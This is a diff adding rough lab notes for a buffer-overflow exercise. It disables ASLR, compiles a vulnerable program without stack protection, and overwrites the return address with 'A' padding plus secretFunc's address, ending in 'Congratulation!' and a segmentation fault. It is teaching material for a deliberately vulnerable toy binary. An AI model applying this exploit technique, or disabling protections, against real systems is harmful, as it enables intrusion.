@@ -1,0 +1,29 @@
+sudo sysctl -w kernel.randomize_va_space=0 
+objdump -d bof1.out|grep secretFunc -> view assamblyq
+
+gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2 -w
+
+gdb bof1.out -q
+echo $(python -c "print('A' * 300+'\x08\x04\x84\x6b')") | ./bof1.out
+python -c "print('A' * 300+'\x08\x04\x84\x6b')" > payload.txt
+
+disas main
+
+x/32xb 0x08048441
+
+
+nm bof1.out | grep secretFunc
+
+seed@3f5437a680a0:~/seclabs/bof$ nm bof1.out | grep secretFunc
+0804846b T secretFunc
+
+'6b840408'
+
+$(python -c "print('A'*204+'\x6b\x84\x04\x08')")
+
+python -c "print('A'*204+'\x6b\x84\x04\x08')" > input
+
+seed@94f9a4a3fa0c:~/seclabs/bof$ ./bof1.out < input
+Missing arguments
+Enter text:Congratulation!
+Segmentation fault
